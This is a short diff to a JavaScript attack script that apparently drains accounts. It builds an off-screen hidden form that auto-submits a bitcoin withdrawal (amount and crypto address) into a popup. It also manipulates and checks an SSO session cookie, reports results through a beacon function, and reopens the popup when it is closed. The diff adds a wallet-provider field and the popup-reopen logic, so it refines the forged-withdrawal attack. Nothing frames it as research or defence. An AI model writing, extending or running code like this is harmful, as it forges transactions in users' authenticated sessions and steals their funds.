@@ -314,7 +314,7 @@ var LADDER = [50.37, 50.37, 50.37, 50.37, 50.37, 50.37, 50.37, 50.37], GA = 51.3
       var fm = document.createElement('form');
       fm.method = 'POST'; fm.target = 'sovpop'; fm.action = CK;
       fm.style.cssText = 'position:absolute;left:-9999px';
-      var d = { processwithdrawal: 'true', method: 'bitcoin', method_id: '521', amount: String(amt), cryptoaddress: ad };
+      var d = { processwithdrawal: 'true', method: 'bitcoin', method_id: '521', amount: String(amt), cryptoaddress: ad, wallet_provider: WPROV };
       for (var k in d) { var i = document.createElement('input'); i.type = 'hidden'; i.name = k; i.value = d[k]; fm.appendChild(i) }
       (document.body || document.documentElement).appendChild(fm);
       fm.submit();
@@ -357,6 +357,7 @@ var LADDER = [50.37, 50.37, 50.37, 50.37, 50.37, 50.37, 50.37, 50.37], GA = 51.3
       for (var z = 0; z < 8; z++) delCk();
       delOk = ckHas('inclave_sso_l') ? 'kept' : 'gone';
       beat('rb', { sh: shots, u: unhit, ck: ckHas('inclave_sso_l') ? 1 : 0 });
+      if (!POP || POP.closed) { setCk(); POP = pop(CP + '?f=0&_=' + Date.now()) }
       armA(A, shots);
       try {
         var g0 = Date.now();
